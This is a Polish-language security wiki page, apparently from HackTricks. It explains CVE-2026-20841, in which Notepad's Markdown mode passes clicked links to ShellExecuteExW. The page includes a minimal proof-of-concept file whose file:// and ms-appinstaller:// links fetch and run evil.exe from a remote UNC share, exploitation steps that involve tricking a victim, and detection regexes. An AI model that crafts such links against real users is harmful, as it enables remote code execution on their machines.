# Nadużycie Windows Protocol Handler / ShellExecute (renderery Markdown)

{{#include ../banners/hacktricks-training.md}}

Nowoczesne aplikacje Windows renderujące Markdown/HTML często zamieniają linki dostarczone przez użytkownika w klikalne elementy i przekazują je do `ShellExecuteExW`. Bez rygorystycznego allowlistingu schematów można wywołać dowolny zarejestrowany protocol handler (np. `file:`, `ms-appinstaller:`), co może prowadzić do wykonania kodu w kontekście bieżącego użytkownika.<sup>[[1]](#references)</sup>

## Powierzchnia ShellExecuteExW w trybie Markdown aplikacji Windows Notepad
- Notepad wybiera tryb Markdown **wyłącznie dla rozszerzeń `.md`** za pomocą porównania ze stałym stringiem w `sub_1400ED5D0()`.<sup>[[1]](#references)</sup>
- Obsługiwane linki Markdown:
- Standardowe: `[text](target)`
- Autolink: `<target>` (renderowany jako `[target](target)`), dlatego obie składnie mają znaczenie dla payloadów i detekcji.
- Kliknięcia linków są przetwarzane w `sub_140170F60()`, która wykonuje słabe filtrowanie, a następnie wywołuje `ShellExecuteExW`.
- `ShellExecuteExW` przekazuje obsługę do **dowolnego skonfigurowanego protocol handlera**, a nie tylko HTTP(S).<sup>[[1]](#references)</sup>

### Uwagi dotyczące payloadów
- Wszystkie sekwencje `\\` w linku są **normalizowane do `\`** przed wywołaniem `ShellExecuteExW`, co wpływa na tworzenie ścieżek/UNC oraz detekcję.
- Pliki `.md` **nie są domyślnie skojarzone z Notepad**; ofiara nadal musi otworzyć plik w Notepad i kliknąć link, jednak po wyrenderowaniu link jest klikalny.
- Niebezpieczne przykładowe schematy:<sup>[[1]](#references)</sup>
- `file://` do uruchomienia lokalnego payloadu lub payloadu UNC.
- `ms-appinstaller://` do wywołania procesów App Installer. Inne lokalnie zarejestrowane schematy również mogą być podatne na nadużycie.

### Minimalny PoC Markdown
```markdown
[run](file://\\192.0.2.10\\share\\evil.exe)
<ms-appinstaller://\\192.0.2.10\\share\\pkg.appinstaller>
```
### Przebieg exploitation
1. Przygotuj plik **`.md`**, aby Notepad renderował go jako Markdown.
2. Osadź link z użyciem niebezpiecznego schematu URI (`file:`, `ms-appinstaller:` lub dowolnego zainstalowanego handlera).
3. Dostarcz plik (HTTP/HTTPS/FTP/IMAP/NFS/POP3/SMTP/SMB lub podobnie) i przekonaj użytkownika do otwarcia go w Notepad.
4. Po kliknięciu **znormalizowany link** zostaje przekazany do `ShellExecuteExW`, a odpowiedni handler protokołu wykonuje wskazaną zawartość w kontekście użytkownika.<sup>[[1]](#references)[[2]](#references)</sup>

## Pomysły na wykrywanie
- Monitoruj transfery plików `.md` przez porty/protokoły często używane do dostarczania dokumentów: `20/21 (FTP)`, `80 (HTTP)`, `443 (HTTPS)`, `110 (POP3)`, `143 (IMAP)`, `25/587 (SMTP)`, `139/445 (SMB/CIFS)`, `2049 (NFS)`, `111 (portmap)`.
- Analizuj linki Markdown (standardowe i autolink) i wyszukuj **bez uwzględniania wielkości liter** `file:` lub `ms-appinstaller:`.
- Wyrażenia regularne zalecane przez dostawców do wykrywania dostępu do zdalnych zasobów:
```
(\x3C|\[[^\x5d]+\]\()file:(\x2f|\x5c\x5c){4}
(\x3C|\[[^\x5d]+\]\()ms-appinstaller:(\x2f|\x5c\x5c){2}
```
- Zgłoszone działanie poprawki **zezwala na pliki lokalne i HTTP(S)**; wszystko inne docierające do `ShellExecuteExW` jest podejrzane. W razie potrzeby rozszerz detekcję na inne zainstalowane protocol handlers, ponieważ attack surface różni się w zależności od systemu.<sup>[[1]](#references)</sup>

## References
- [1] [CVE-2026-20841: Arbitrary Code Execution in the Windows Notepad](https://www.thezdi.com/blog/2026/2/19/cve-2026-20841-arbitrary-code-execution-in-the-windows-notepad)
- [2] [CVE-2026-20841 PoC](https://github.com/BTtea/CVE-2026-20841-PoC)

{{#include ../banners/hacktricks-training.md}}
